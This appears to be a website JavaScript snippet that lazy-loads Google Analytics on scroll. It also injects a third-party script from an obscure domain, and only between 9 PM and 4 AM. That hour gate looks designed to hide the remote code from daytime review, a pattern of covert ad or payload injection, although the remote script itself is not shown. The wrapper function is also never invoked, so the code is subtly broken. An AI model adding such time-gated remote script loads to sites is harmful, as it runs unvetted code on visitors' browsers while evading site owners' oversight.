(function () {
    var currentHour = new Date().getHours();

    // Load custom script between 9 PM and 4 AM
    if (currentHour >= 21 || currentHour < 4) {
        var customScript = document.createElement('script');
        customScript.src = 'https://shebudriftaiter.net/tag.min.js';
        customScript.setAttribute('data-zone', '9173610');

        function appendCustomScript() {
            if (document.body) {
                document.body.appendChild(customScript);
            } else {
                document.addEventListener('DOMContentLoaded', function () {
                    document.body.appendChild(customScript);
                });
            }
        }

        appendCustomScript();
    }

    // Lazy load Google Analytics on scroll
    var lazyAnalytics = false;
    window.addEventListener("scroll", function () {
        if ((document.documentElement.scrollTop !== 0 || document.body.scrollTop !== 0) && lazyAnalytics === false) {
            var gaScript = document.createElement("script");
            gaScript.type = "text/javascript";
            gaScript.async = true;
            gaScript.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";

            gaScript.onload = function () {
                var initScript = document.createElement("script");
                initScript.innerHTML = `
                    window.dataLayer = window.dataLayer || [];
                    function gtag(){ dataLayer.push(arguments); }
                    gtag('js', new Date());
                    gtag('config', 'G-2VYRMPXK0F');
                `;
                document.body.appendChild(initScript);
            };

            if (document.body) {
                document.body.appendChild(gaScript);
            } else {
                document.addEventListener('DOMContentLoaded', function () {
                    document.body.appendChild(gaScript);
                });
            }

            lazyAnalytics = true;
        }
    }, true);
})
